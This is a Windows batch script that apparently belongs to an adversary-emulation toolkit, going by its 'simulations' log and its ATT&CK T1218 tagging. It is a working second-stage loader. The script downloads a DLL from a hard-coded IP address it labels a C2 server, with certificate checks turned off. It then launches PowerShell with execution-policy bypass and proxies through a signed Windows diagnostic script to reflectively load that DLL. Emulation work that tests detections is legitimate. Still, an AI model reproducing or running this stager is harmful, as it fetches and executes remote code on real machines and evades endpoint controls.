@echo off
setlocal enabledelayedexpansion

REM Stage 2 BAT - Download and invoke .NET Loader DLL via PowerShell LOLBIN
REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcDeFgH=%APPDATA%\49318\e4dd6f77
SET xYz123Ab=1cc11011.txt
SET qWeRtY=https://3.144.153.50/test/stage/2/icon.png?QFxARWc-R1dE
SET lMnOpQr=ITZEL-S2B
SET sTuVwXy=QFxARWc
SET zZaAbBc=R1dE
SET cCdDeEf=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Debug log: script start
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: script_start>> "!cCdDeEf!" 2>nul

REM Step 1: Heartbeat fetch - download Stage 2 Loader DLL from C2
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: heartbeat_start>> "!cCdDeEf!" 2>nul
curl -k -s -o "!aBcDeFgH!\!xYz123Ab!" "!qWeRtY!" >nul 2>&1
if !errorlevel! neq 0 (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: heartbeat_failed>> "!cCdDeEf!" 2>nul
    goto :invocation_fail
)
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: heartbeat_complete>> "!cCdDeEf!" 2>nul

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: chdir_start>> "!cCdDeEf!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
if !errorlevel! equ 0 (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: chdir_result=0>> "!cCdDeEf!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: chdir_result=1>> "!cCdDeEf!" 2>nul
)

REM Step 3: Invoke Stage 2 DLL via CL_LoadAssembly.ps1 (LOLBIN)
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: powershell_start>> "!cCdDeEf!" 2>nul
powershell.exe -ep bypass -command "$base='C:\Windows\diagnostics\system\Audio'; $target='!aBcDeFgH!\!xYz123Ab!'; $rel=[Uri]::UnescapeDataString((New-Object Uri($base)).MakeRelativeUri((New-Object Uri($target))).ToString()); $rel=$rel.Replace('/','\'); Set-Location $base; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\$rel; [Loader]::ReflectiveLoader();"
set ps_exit=!errorlevel!
if !ps_exit! equ 0 (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: powershell_end=0>> "!cCdDeEf!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: powershell_end=!ps_exit!>> "!cCdDeEf!" 2>nul
)
goto :log_ttp

:invocation_fail
echo [!tsvar!][DEBUG][!lMnOpQr!][!sTuVwXy!]: powershell_end=1>> "!cCdDeEf!" 2>nul
set ps_exit=1

:log_ttp
REM Generate timestamp for TTP log
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttp_ts=%%t
if !ps_exit! equ 0 (
    echo [!ttp_ts!][TTP][!lMnOpQr!][!sTuVwXy!]: T1218^|System Binary Proxy Execution=OK:[]>> "!cCdDeEf!" 2>&1
) else (
    echo [!ttp_ts!][TTP][!lMnOpQr!][!sTuVwXy!]: T1218^|System Binary Proxy Execution=FAIL:exitcode=!ps_exit!>> "!cCdDeEf!" 2>&1
)

endlocal